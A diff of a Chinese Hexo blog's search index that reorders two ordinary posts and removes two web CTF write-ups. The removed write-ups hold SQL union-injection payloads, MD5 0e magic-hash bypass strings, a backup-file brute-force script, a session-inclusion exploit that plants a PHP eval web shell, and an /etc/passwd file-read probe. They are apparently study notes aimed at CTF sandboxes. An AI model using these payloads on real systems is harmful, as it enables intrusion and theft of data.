@@ -1,33 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Java实战</title>
-    <url>/2024/02/07/Java%E5%AE%9E%E6%88%98/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>Languages</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>项目实战</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Open new world</title>
-    <url>/2024/01/13/Open-new-world/</url>
-    <content><![CDATA[<h2 id="OPEN-NEW-WORLD"><a href="#OPEN-NEW-WORLD" class="headerlink" title="OPEN NEW WORLD"></a>OPEN NEW WORLD</h2><p>敬请T期待！</p>
-<p>路漫漫其修远兮，吾将上下而求索！</p>
-<p>​																–《离骚》屈原</p>
-<p>杨宪益先生 译：<br>The way was long, and wrapped in gloom did seem,<br>As I urged on to seek my vanished dream.</p>
-]]></content>
-      <categories>
-        <category>Life</category>
-      </categories>
-      <tags>
-        <tag>Hope_flag</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2024-计划书单</title>
     <url>/2024/01/23/2024-%E8%AE%A1%E5%88%92%E4%B9%A6%E5%8D%95/</url>
     <content><![CDATA[<h2 id="预祝新的一年你会有更多的属于自己的时刻！❀❀❀"><a href="#预祝新的一年你会有更多的属于自己的时刻！❀❀❀" class="headerlink" title="预祝新的一年你会有更多的属于自己的时刻！❀❀❀"></a>预祝新的一年你会有更多的属于自己的时刻！❀❀❀</h2><h3 id="《家山》-王跃文"><a href="#《家山》-王跃文" class="headerlink" title="《家山》-王跃文"></a>《家山》-王跃文</h3><ul>
@@ -101,6 +74,33 @@ over</p>
         <tag>书单</tag>
         <tag>Love</tag>
         <tag>Book</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java实战</title>
+    <url>/2024/02/07/Java%E5%AE%9E%E6%88%98/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>Languages</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>项目实战</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Open new world</title>
+    <url>/2024/01/13/Open-new-world/</url>
+    <content><![CDATA[<h2 id="OPEN-NEW-WORLD"><a href="#OPEN-NEW-WORLD" class="headerlink" title="OPEN NEW WORLD"></a>OPEN NEW WORLD</h2><p>敬请T期待！</p>
+<p>路漫漫其修远兮，吾将上下而求索！</p>
+<p>​																–《离骚》屈原</p>
+<p>杨宪益先生 译：<br>The way was long, and wrapped in gloom did seem,<br>As I urged on to seek my vanished dream.</p>
+]]></content>
+      <categories>
+        <category>Life</category>
+      </categories>
+      <tags>
+        <tag>Hope_flag</tag>
       </tags>
   </entry>
   <entry>
@@ -379,314 +379,6 @@ over</p>
         <tag>Web</tag>
         <tag>安全</tag>
         <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctf.show_web</title>
-    <url>/2024/02/20/ctf-show-web/</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer">
-
-<h2 id="CTF-show秀"><a href="#CTF-show秀" class="headerlink" title="CTF.show秀"></a>CTF.show秀</h2><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_1.png" alt="ctf.show_web4_1"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_2.png" alt="ctf.show_web4_2"></p>
-<blockquote>
-<p>一个文件包含漏洞题目,<strong>日志注入</strong></p>
-</blockquote>
-<blockquote>
-<p><u>使用include()函数接收url参数,include()函数包含的文件会被执行,从而造成任意代码执行,或者配合伪协议获取敏感文件甚至getshell;</u></p>
-<p>本题伪协议不起作用,我们可以通过日志注入进行任意命令执行,从而getshell</p>
-</blockquote>
-<h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_1.png" alt="ctf.show_web5_1"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_2.png" alt="ctf.show_web5_2"></p>
-<blockquote>
-<p>传递两个参数,一个字符串,一个数字,并且两个参数的md5值必须相同,我们可以利用<strong>md5的0e漏洞进行绕过</strong></p>
-<p>通过GET请求传递两个参数v1和v2,并且参数v1必须是纯字母字符串,参数v2必须是数字或者数字字符串,并且两个参数的md5值必须相等</p>
-</blockquote>
-<blockquote>
-<p>0e绕过是指:0e开头的字符串在参与弱类型比较时,会被当做科学计数法,结果转换为0;</p>
-</blockquote>
-<blockquote>
-<ul>
-<li><strong>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</strong></li>
-<li><strong>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</strong></li>
-</ul>
-</blockquote>
-<blockquote>
-<p>两个md5值进行弱类型比较</p>
-<blockquote>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(&#x27;QNKCDZO&#x27;) == md5(240610708)</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p>MD5加密后会变成这个样子</p>
-<blockquote>
-<p>0e830400451993494058024219903391 &#x3D;&#x3D; 0e462097431906509019562988736854</p>
-</blockquote>
-<p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样</p>
-<blockquote>
-<p>0&#x3D;&#x3D;0</p>
-</blockquote>
-<p>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等</p>
-</blockquote>
-<p><em><strong><u>常用的MD5加密后以0E开头的有</u></strong></em></p>
-<blockquote>
-<p>​    QNKCDZO<br>​    240610708<br>​    byGcY<br>​    sonZ7y<br>​    aabg7XSs<br>​    aabC9RqS<br>​    s878926199a<br>​    s155964671a<br>​    s214587387a<br>​    s1091221200a</p>
-</blockquote>
-<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><blockquote>
-<p>SQL联合注入</p>
-</blockquote>
-<blockquote>
-<p>打开题目看见文章列表，随机点击，点第一个</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_1.png" alt="ctfshow_web7_1"></p>
-<blockquote>
-<p>发现显示文章，本想搜索flag,发现没有，看见url中id&#x3D;1</p>
-<p><strong><u>从url地址栏中可以看到,页面通过文章的id值来查询文章内容,我们可以考虑SQL注入漏洞</u></strong></p>
-<p>首先判断注入点,输入以下payload,使SQL恒成立,发现显示文章成功</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/1</span><br></pre></td></tr></table></figure></div>
-
-<p>在输入以下payload,使SQL恒不成立,发现显示不出文章，</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/0</span><br></pre></td></tr></table></figure></div>
-
-<p>由此可以判断页面存在SQL注入,注入点为<u><strong>数值型注入</strong></u>,页面中有显示位,可以尝试<u><strong>联合注入</strong></u>进行脱库</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_2.png" alt="ctfshow_web7_2"></p>
-<blockquote>
-<p>先来判断显示位,此处id传一个**-1**,<strong>由于id通常不为负数,后端根据id查询不到内容</strong>,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_3.png" alt="ctfshow_web7_3"></p>
-<blockquote>
-<p>判断数据库</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,database(),3#</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_4.png" alt="ctfshow_web7_4"></p>
-<blockquote>
-<p>查看web数据库中的flag表</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3#</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_5.png" alt="ctfshow_web7_5"></p>
-<blockquote>
-<p>查看flag表中的flag字段</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;),3#</span><br></pre></td></tr></table></figure></div>
-
-<p>也可使用</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3</span><br></pre></td></tr></table></figure></div>
-
-
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_6.png" alt="ctfshow_web7_6"></p>
-<blockquote>
-<p>查看目标FLAG</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#</span><br></pre></td></tr></table></figure></div>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_7.png" alt="ctfshow_web7_7"></p>
-<h2 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h2><h3 id="WEB-请求方式"><a href="#WEB-请求方式" class="headerlink" title="WEB_请求方式"></a><strong>WEB_请求方式</strong></h3><hr>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1.png" alt="请求方式"></p>
-<hr>
-<p>用burpsuit抓包,重放，将GET改成<strong>CTFHUB</strong>，发送即可获得flag</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_1.png" alt="BURPSUIT"></p>
-<p>falg</p>
-<hr>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_2.png" alt="flag"></p>
-<hr>
-<h3 id="信息页面隐藏"><a href="#信息页面隐藏" class="headerlink" title="信息页面隐藏"></a>信息页面隐藏</h3><hr>
-<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_1.png" alt="CTFHUB_WEB_2_1" style="zoom: 80%;">
-
-<p>看见页面信息繁杂，flag可能就隐藏在页面中，火狐快捷键*<u><strong>Ctrl+f</strong></u>*快捷查找，输入flag找到FLAG。</p>
-<hr>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_2.png" alt="CTFHUB_WEB_2_2"></p>
-<hr>
-<h3 id="备份文件下载——网站源码"><a href="#备份文件下载——网站源码" class="headerlink" title="备份文件下载——网站源码"></a>备份文件下载——网站源码</h3><p><strong>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</strong></p>
-<hr>
-<blockquote>
-<h4 id="常见的网站源码备份文件后缀"><a href="#常见的网站源码备份文件后缀" class="headerlink" title="常见的网站源码备份文件后缀"></a>常见的网站源码备份文件后缀</h4><hr>
-<ul>
-<li>tar</li>
-<li>tar.gz</li>
-<li>zip</li>
-<li>rar</li>
-</ul>
-<h4 id="常见的网站源码备份文件名"><a href="#常见的网站源码备份文件名" class="headerlink" title="常见的网站源码备份文件名"></a>常见的网站源码备份文件名</h4><hr>
-<ul>
-<li>web</li>
-<li>website</li>
-<li>backup</li>
-<li>back</li>
-<li>www</li>
-<li>wwwroot</li>
-<li>temp</li>
-</ul>
-</blockquote>
-<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_1.png" alt="CTFHUB_WEB_3_1" style="zoom:50%;">
-
-<p>文件下载，用python脚本，requests</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/&quot;</span></span><br><span class="line"></span><br><span class="line">li1=[<span class="string">&quot;web&quot;</span>,<span class="string">&quot;website&quot;</span>,<span class="string">&quot;backup&quot;</span>,<span class="string">&quot;back&quot;</span>,<span class="string">&quot;www&quot;</span>,<span class="string">&quot;wwwroot&quot;</span>,<span class="string">&quot;temp&quot;</span>]</span><br><span class="line">li2=[<span class="string">&quot; tar&quot;</span>,<span class="string">&quot;tar.gz&quot;</span>,<span class="string">&quot;zip&quot;</span>,<span class="string">&quot;rar&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li2:</span><br><span class="line">        url_final = url +<span class="string">&quot;/&quot;</span>+i+<span class="string">&quot;.&quot;</span>+j</span><br><span class="line">        r=requests.get(url_final)</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Response [404]&gt;//1</span><br><span class="line">&lt;Response [404]&gt;//2</span><br><span class="line">&lt;Response [404]&gt;//3</span><br><span class="line">&lt;Response [404]&gt;//4</span><br><span class="line">&lt;Response [404]&gt;//5</span><br><span class="line">&lt;Response [404]&gt;//6</span><br><span class="line">&lt;Response [404]&gt;//7</span><br><span class="line">&lt;Response [404]&gt;//8</span><br><span class="line">&lt;Response [404]&gt;//9</span><br><span class="line">&lt;Response [404]&gt;//10</span><br><span class="line">&lt;Response [404]&gt;//11</span><br><span class="line">&lt;Response [404]&gt;//12</span><br><span class="line">&lt;Response [404]&gt;//13</span><br><span class="line">&lt;Response [404]&gt;//14</span><br><span class="line">&lt;Response [404]&gt;//15</span><br><span class="line">&lt;Response [404]&gt;//16</span><br><span class="line">&lt;Response [404]&gt;//17</span><br><span class="line">&lt;Response [404]&gt;//18</span><br><span class="line">&lt;Response [200]&gt;//[200]19</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>得到备份文件”<a class="link" href="http://www.zip/">www.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“</p>
-<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEwww.zip%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%BE%97%E5%88%B0%E5%8E%8B%E7%BC%A9%E5%8C%85www.zip%EF%BC%8C%E8%A7%A3%E5%8E%8B%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%EF%BC%8C%E5%A6%82%E5%9B%BE%EF%BC%9A">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip直接访问www.zip下载，得到压缩包www.zip，解压打开文件，如图： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_2.png" alt="CTFHUB_WEB_3_2"></p>
-<p>打开flag文件，发现没有flag</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_3.png" alt="CTFHUB_WEB_3_3"></p>
-<p>直接用</p>
-<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt%E5%BE%97%E5%88%B0flag">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt得到flag <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h2 id="Web-弱口令"><a href="#Web-弱口令" class="headerlink" title="Web_弱口令"></a>Web_弱口令</h2><blockquote>
-<p><strong>弱口令</strong></p>
-<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。 </p>
-</blockquote>
-<p>使用<code>BurpSuite</code>中<code>Intruder</code>模块 ，即暴力破解模块(或在fuzz中使用)</p>
-<p>开启burp代理</p>
-<p>登录信息随便填，抓到request请求如下</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Origin: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name=admin&amp;password=ctfhub&amp;referer=</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_2.png" alt="CTFHUB_WEB_4_2"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_3.png" alt="CTFHUB_WEB_4_3"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_4.png" alt="CTFHUB_WEB_4_4"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_5.png" alt="CTFHUB_WEB_4_5"></p>
-]]></content>
-      <tags>
-        <tag>笔记</tag>
-        <tag>CTF</tag>
-        <tag>ctf.show</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>webctf</title>
-    <url>/2024/03/13/webctf/</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer">
-
-<h1 id="CTF-WEB"><a href="#CTF-WEB" class="headerlink" title="CTF_WEB"></a>CTF_WEB</h1><h2 id="SQL注入：联合注入"><a href="#SQL注入：联合注入" class="headerlink" title="SQL注入：联合注入"></a>SQL注入：联合注入</h2><p>1、数据库为mysql的爆库、爆表、爆字段、爆值的语句：</p>
-<p><strong>爆库：</strong></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,database();#查看此处有多字段</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>爆表：</strong></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database(); #   </span><br></pre></td></tr></table></figure></div>
-
-<p><strong>爆字段：</strong></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&quot;表名&quot;; # </span><br></pre></td></tr></table></figure></div>
-
-<p><strong>爆值：</strong></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,字段 from 表名; #   </span><br></pre></td></tr></table></figure></div>
-
-<p>例子：</p>
-<blockquote>
-<p>常规套路：</p>
-<p>1、查字段</p>
-<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>order<span class="comment">/**/</span>by<span class="comment">/**/</span><span class="number">3</span>#admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure></div>
-
-<p>2、查库(web2)</p>
-<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">database</span>(),<span class="number">3</span>#</span><br></pre></td></tr></table></figure></div>
-
-<p>3、查表（flag,user）</p>
-<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name),<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="symbol">&#x27;web2</span>&#x27;#</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name),<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="title function_ invoke__">database</span>()#(模板)</span><br></pre></td></tr></table></figure></div>
-
-<p>4、查字段flag</p>
-<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name),<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name=<span class="symbol">&#x27;flag</span>&#x27;#</span><br></pre></td></tr></table></figure></div>
-
-<p>5、查字段flag内容</p>
-<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,flag,<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>flag#</span><br></pre></td></tr></table></figure></div>
-
-
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_1.png">*</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_2.png" alt="ctfshow_web6_2"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_3.png" alt="ctfshow_web6_3"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_4.png" alt="ctfshow_web6_4"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_5.png" alt="ctfshow_web6_5"></p>
-<p>注意查找字段图中红色字体错误了，应该为information_schema.columns&#x2F;**&#x2F;,图中column少了s</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_6.png" alt="ctfshow_web6_6"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_7.png" alt="ctfshow_web6_7"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_8.png" alt="ctfshow_web6_8"></p>
-<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>实战例子：</p>
-<p>CTFshow&#x2F; easy_include</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>代码解释：</p>
-<blockquote>
-<p>观察cookie，发现自动开启了session，直接session文件包含</p>
-<p>如果能获取PHPSESSID<br>    “请求 Cookie”: {<br>        <strong>“PHPSESSID”: “a5c4fd8ef729d435160c08a37d20ed7a”</strong><br>    }</p>
-</blockquote>
-<p>EXP:</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># Author:ctfshow-h1xa</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;localhost/tmp/sess_ctfshow&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;system(&quot;cat /flag_is_here.txt&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data,files=file,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h1 id="php文件漏洞"><a href="#php文件漏洞" class="headerlink" title="php文件漏洞"></a>php文件漏洞</h1><p><strong>get方式查看文件漏洞</strong></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/etc/passwd  </span><br><span class="line">#GET /?url=/etc/passwd HTTP/1.1</span><br><span class="line">#若出现大串文件，则有文件漏洞</span><br><span class="line">#($_GET[&#x27;url&#x27;])极有可能含有文件漏洞</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>使用php协议</strong></p>
